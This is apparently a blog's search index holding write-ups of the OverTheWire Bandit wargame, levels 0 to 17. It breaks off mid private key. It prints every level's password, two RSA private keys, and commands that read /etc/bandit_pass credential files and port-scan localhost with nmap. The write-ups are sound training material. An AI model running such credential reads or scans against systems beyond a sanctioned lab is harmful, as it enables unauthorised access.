{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Home About Me I deal mainly with offensive security. I like to do CTFs and do random sysadmin things in my homelab. In the process of getting spun up with traditional defensive security. About the Blog This blog is here primarily to help me document and further solidify lessons learned, while hopefully benefiting others as well. Social Social links are down below, but I'm not very active currently. I do a lot of commits to GitHub, though. CTFs and Write-Ups I do my best to document my process. If I have incomplete sections, I'm likely still working on it. I'll finish it! Wiki I also have a wiki that I try to update. If you're looking for any additional information check it out!","title":"Home"},{"location":"#home","text":"","title":"Home"},{"location":"#about-me","text":"I deal mainly with offensive security. I like to do CTFs and do random sysadmin things in my homelab. In the process of getting spun up with traditional defensive security.","title":"About Me"},{"location":"#about-the-blog","text":"This blog is here primarily to help me document and further solidify lessons learned, while hopefully benefiting others as well.","title":"About the Blog"},{"location":"#social","text":"Social links are down below, but I'm not very active currently. I do a lot of commits to GitHub, though.","title":"Social"},{"location":"#ctfs-and-write-ups","text":"I do my best to document my process. If I have incomplete sections, I'm likely still working on it. I'll finish it!","title":"CTFs and Write-Ups"},{"location":"#wiki","text":"I also have a wiki that I try to update. If you're looking for any additional information check it out!","title":"Wiki"},{"location":"Write-Ups/OverTheWire/Bandit/Level%200/","text":"Level 0 Objectives Just SSH into the box. Objective 1 Username: bandit0 Password: bandit0 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit0@bandit.labs.overthewire.org","title":"Level 0"},{"location":"Write-Ups/OverTheWire/Bandit/Level%200/#level-0","text":"","title":"Level 0"},{"location":"Write-Ups/OverTheWire/Bandit/Level%200/#objectives","text":"Just SSH into the box.","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%200/#objective-1","text":"Username: bandit0 Password: bandit0 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit0@bandit.labs.overthewire.org","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%201/","text":"Level 1 Objectives Now we're looking for a file called readme in the home directory. Objective 1 ls will show us that it's there. bandit0@bandit:~$ ls readme Now we just need to use cat to read it. bandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1","title":"Level 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%201/#level-1","text":"","title":"Level 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%201/#objectives","text":"Now we're looking for a file called readme in the home directory.","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%201/#objective-1","text":"ls will show us that it's there. bandit0@bandit:~$ ls readme Now we just need to use cat to read it. bandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2010/","text":"Level 10 Objectives SSH to user bandit9 Read the password from data.txt from a human-readable string beginning with several = . Objective 1 Username: bandit9 Password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit9@bandit.labs.overthewire.org Success! Objective 2 A give away from the description is that there are human-readable strings in this file. Typically a .txt file is all human-readable. Check the file with the file command. bandit9@bandit:~$ file data.txt data.txt: data This isn't a human-readable file, it's a binary. We can search through binary files with the strings command. It's similar to cat in this aspect. Before we do that, since we know we're looking for \"several = \", we can pipe that into grep with a couple = . bandit9@bandit:~$ strings data.txt | grep '==' 2 ========== the ========== password ========== isa ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk","title":"Level 10"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2010/#level-10","text":"","title":"Level 10"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2010/#objectives","text":"SSH to user bandit9 Read the password from data.txt from a human-readable string beginning with several = .","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2010/#objective-1","text":"Username: bandit9 Password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit9@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2010/#objective-2","text":"A give away from the description is that there are human-readable strings in this file. Typically a .txt file is all human-readable. Check the file with the file command. bandit9@bandit:~$ file data.txt data.txt: data This isn't a human-readable file, it's a binary. We can search through binary files with the strings command. It's similar to cat in this aspect. Before we do that, since we know we're looking for \"several = \", we can pipe that into grep with a couple = . bandit9@bandit:~$ strings data.txt | grep '==' 2 ========== the ========== password ========== isa ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2011/","text":"Level 11 Objectives SSH to user bandit10 Read password from data.txt , which is base64 encoded Objective 1 Username: bandit10 Password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit10@bandit.labs.overthewire.org Success! Objective 2 data.txt is an ASCII file, so all we'll need to do is read the file and decode it with base64 . bandit10@bandit:~$ cat data.txt | base64 -d The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR","title":"Level 11"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2011/#level-11","text":"","title":"Level 11"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2011/#objectives","text":"SSH to user bandit10 Read password from data.txt , which is base64 encoded","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2011/#objective-1","text":"Username: bandit10 Password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit10@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2011/#objective-2","text":"data.txt is an ASCII file, so all we'll need to do is read the file and decode it with base64 . bandit10@bandit:~$ cat data.txt | base64 -d The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2012/","text":"Level 12 Objectives SSH to user bandit11 Read password from file data.txt where all uppercase and lowercase letters have been rotated by 13 positions. Objective 1 Username: bandit11 Password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit11@bandit.labs.overthewire.org Success! Objective 2 Since the file is ASCII, we should be able to read from the file and use tr to translate characters based on simple regular expression. Read data.txt into tr , which will translate the typical A-Z to start at N and wrap all the way around to M . Do the same for lowercase. bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu","title":"Level 12"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2012/#level-12","text":"","title":"Level 12"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2012/#objectives","text":"SSH to user bandit11 Read password from file data.txt where all uppercase and lowercase letters have been rotated by 13 positions.","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2012/#objective-1","text":"Username: bandit11 Password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit11@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2012/#objective-2","text":"Since the file is ASCII, we should be able to read from the file and use tr to translate characters based on simple regular expression. Read data.txt into tr , which will translate the typical A-Z to start at N and wrap all the way around to M . Do the same for lowercase. bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2013/","text":"Level 13 Objectives SSH to user bandit12 Read the password from file data.txt which is a hexdump of a file that has been repeatedly compressed. Objective 1 Username: bandit12 Password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit12@bandit.labs.overthewire.org Objective 2 OverTheWire suggests we copy the file to /tmp to work. bandit12@bandit:~$ mkdir /tmp/dirwalk bandit12@bandit:~$ cp data.txt /tmp/dirwalk/ bandit12@bandit:~$ cd /tmp/dirwalk We need to revert the hexdump and push the output to a file. bandit12@bandit:/tmp/dirwalk$ xxd -r data.txt > data.1 You will need use file and rename ( mv ) the file appropriately. gzip = .gz bzip2 = bz2 tar = .tar You will need to decompress each file type with the appropraite command. gzip = gunzip bzip2 = bunzip2 tar = tar xf After you have finished with your file and your decompress commands, you will finall have your ASCII text. bandit12@bandit:/tmp/dirwalk$ cat data8 The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL","title":"Level 13"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2013/#level-13","text":"","title":"Level 13"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2013/#objectives","text":"SSH to user bandit12 Read the password from file data.txt which is a hexdump of a file that has been repeatedly compressed.","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2013/#objective-1","text":"Username: bandit12 Password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit12@bandit.labs.overthewire.org","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2013/#objective-2","text":"OverTheWire suggests we copy the file to /tmp to work. bandit12@bandit:~$ mkdir /tmp/dirwalk bandit12@bandit:~$ cp data.txt /tmp/dirwalk/ bandit12@bandit:~$ cd /tmp/dirwalk We need to revert the hexdump and push the output to a file. bandit12@bandit:/tmp/dirwalk$ xxd -r data.txt > data.1 You will need use file and rename ( mv ) the file appropriately. gzip = .gz bzip2 = bz2 tar = .tar You will need to decompress each file type with the appropraite command. gzip = gunzip bzip2 = bunzip2 tar = tar xf After you have finished with your file and your decompress commands, you will finall have your ASCII text. bandit12@bandit:/tmp/dirwalk$ cat data8 The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2014/","text":"Level 14 Objectives SSH to user bandit13 Get SSH private key in /etc/bandit_pass/bandit14 , which is readable by only bandit14. Objective 1 Username: bandit13 Password: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit13@bandit.labs.overthewire.org Success! Objective 2 The SSH private key shouldn't be readable by us, but we'll be able to use it as the password for bandit14 . If you do an ls , you'll see that there is sshkey.private in the home directory. bandit13@bandit:~$ cat sshkey.private -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+ gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7 jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67 xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU 1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s 8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+ xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1 GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J 3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby 9 /8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0 kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN /+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA == -----END RSA PRIVATE KEY----- Save this to a file on your local machine and change it's permissions as we prepare for the next user. user@localhost:~$ chmod 600 sshkey.private","title":"Level 14"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2014/#level-14","text":"","title":"Level 14"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2014/#objectives","text":"SSH to user bandit13 Get SSH private key in /etc/bandit_pass/bandit14 , which is readable by only bandit14.","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2014/#objective-1","text":"Username: bandit13 Password: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit13@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2014/#objective-2","text":"The SSH private key shouldn't be readable by us, but we'll be able to use it as the password for bandit14 . If you do an ls , you'll see that there is sshkey.private in the home directory. bandit13@bandit:~$ cat sshkey.private -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+ gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7 jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67 xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU 1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s 8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+ xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1 GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J 3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby 9 /8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0 kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN /+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA == -----END RSA PRIVATE KEY----- Save this to a file on your local machine and change it's permissions as we prepare for the next user. user@localhost:~$ chmod 600 sshkey.private","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2015/","text":"Level 15 Objectives SSH to user bandit14 Obtaining the password by submitting the password for bandit14 to port 30000 on localhost. Objective 1 Username: bandit14 Password: sshkey.private Port: 2220 IP/Hostname: bandit.labs.overthewire.org Assuming you have the private key with the correct permissions, SSH to bandit14 using the private key (identity file). user@localhost:~$ ssh -p 2220 bandit14@bandit.labs.overthewire.org -i sshkey.private Success! Objective 2 The password file was said to be /etc/bandit_pass/bandit14 , so we need to get that first. bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Now that we have the password for bandit14 , we need to get the password for bandit15 by submitting the password to 30000. We can do this with nc and pasting in the password after the connection. bandit14@bandit:~$ nc localhost 30000 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Correct! BfMYroe26WYalil77FoDi9qh59eK5xNr","title":"Level 15"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2015/#level-15","text":"","title":"Level 15"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2015/#objectives","text":"SSH to user bandit14 Obtaining the password by submitting the password for bandit14 to port 30000 on localhost.","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2015/#objective-1","text":"Username: bandit14 Password: sshkey.private Port: 2220 IP/Hostname: bandit.labs.overthewire.org Assuming you have the private key with the correct permissions, SSH to bandit14 using the private key (identity file). user@localhost:~$ ssh -p 2220 bandit14@bandit.labs.overthewire.org -i sshkey.private Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2015/#objective-2","text":"The password file was said to be /etc/bandit_pass/bandit14 , so we need to get that first. bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Now that we have the password for bandit14 , we need to get the password for bandit15 by submitting the password to 30000. We can do this with nc and pasting in the password after the connection. bandit14@bandit:~$ nc localhost 30000 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Correct! BfMYroe26WYalil77FoDi9qh59eK5xNr","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2016/","text":"Level 16 Objectives Get password by sending bandit15 password to port 30001 via SSL encryption. Objective 1 We remain on the same box as before ( bandit14 ) and connect via SSL encryption to port 30001. This can be done easily with the openssl command. You then simply paste the previously recieved password to get the password for bandit16 . bandit14@bandit:~$ openssl s_client -connect 127 .0.0.1:30001 CONNECTED ( 00000003 ) depth = 0 CN = localhost verify error:num = 18 :self signed certificate ... Start Time: 1584985334 Timeout : 7200 ( sec ) Verify return code: 18 ( self signed certificate ) Extended master secret: yes --- BfMYroe26WYalil77FoDi9qh59eK5xNr Correct! cluFn7wTiGryunymYOu4RcffSxQluehd closed","title":"Level 16"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2016/#level-16","text":"","title":"Level 16"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2016/#objectives","text":"Get password by sending bandit15 password to port 30001 via SSL encryption.","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2016/#objective-1","text":"We remain on the same box as before ( bandit14 ) and connect via SSL encryption to port 30001. This can be done easily with the openssl command. You then simply paste the previously recieved password to get the password for bandit16 . bandit14@bandit:~$ openssl s_client -connect 127 .0.0.1:30001 CONNECTED ( 00000003 ) depth = 0 CN = localhost verify error:num = 18 :self signed certificate ... Start Time: 1584985334 Timeout : 7200 ( sec ) Verify return code: 18 ( self signed certificate ) Extended master secret: yes --- BfMYroe26WYalil77FoDi9qh59eK5xNr Correct! cluFn7wTiGryunymYOu4RcffSxQluehd closed","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2017/","text":"Level 17 Objectives SSH to user bandit16 Retrieve credentials by submitting the current password to a port in the range of 31000-32000. Objective 1 Username: bandit16 Password: cluFn7wTiGryunymYOu4RcffSxQluehd Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit16@bandit.labs.overthewire.org Success! Objective 2 The goal seems to indicate that we should be looking for one of the open ports to serve us SSL. First, we should scan which ports are open on our box. netstat and ss yield no results, so let's try nmap . We should use the -sV flag to attempt to find which port is utilizing some form of SSL. bandit16@bandit:~$ nmap -sV -Pn localhost -p31000-32000 -T5 --open Starting Nmap 7 .40 ( https://nmap.org ) at 2020 -03-23 18 :50 CET Nmap scan report for localhost ( 127 .0.0.1 ) Host is up ( 0 .00045s latency ) . Not shown: 999 closed ports, 1 filtered port Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 31790 /tcp open ssl/unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : ... Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done : 1 IP address ( 1 host up ) scanned in 89 .45 seconds Now we need to connect to it and pass it the current password. bandit16@bandit:~$ openssl s_client -connect 127 .0.0.1:31790 CONNECTED ( 00000003 ) depth = 0 CN = localhost verify error:num = 18 :self signed certificate ... --- cluFn7wTiGryunymYOu4RcffSxQluehd Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY = -----END RSA PRIVATE KEY----- closed Copy this private key to a file and chmod 600 to use for next user.","title":"Level 17"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2017/#level-17","text":"","title":"Level 17"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2017/#objectives","text":"SSH to user bandit16 Retrieve credentials by submitting the current password to a port in the range of 31000-32000.","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2017/#objective-1","text":"Username: bandit16 Password: cluFn7wTiGryunymYOu4RcffSxQluehd Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit16@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2017/#objective-2","text":"The goal seems to indicate that we should be looking for one of the open ports to serve us SSL. First, we should scan which ports are open on our box. netstat and ss yield no results, so let's try nmap . We should use the -sV flag to attempt to find which port is utilizing some form of SSL. bandit16@bandit:~$ nmap -sV -Pn localhost -p31000-32000 -T5 --open Starting Nmap 7 .40 ( https://nmap.org ) at 2020 -03-23 18 :50 CET Nmap scan report for localhost ( 127 .0.0.1 ) Host is up ( 0 .00045s latency ) . Not shown: 999 closed ports, 1 filtered port Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 31790 /tcp open ssl/unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : ... Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done : 1 IP address ( 1 host up ) scanned in 89 .45 seconds Now we need to connect to it and pass it the current password. bandit16@bandit:~$ openssl s_client -connect 127 .0.0.1:31790 CONNECTED ( 00000003 ) depth = 0 CN = localhost verify error:num = 18 :self signed certificate ... --- cluFn7wTiGryunymYOu4RcffSxQluehd Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 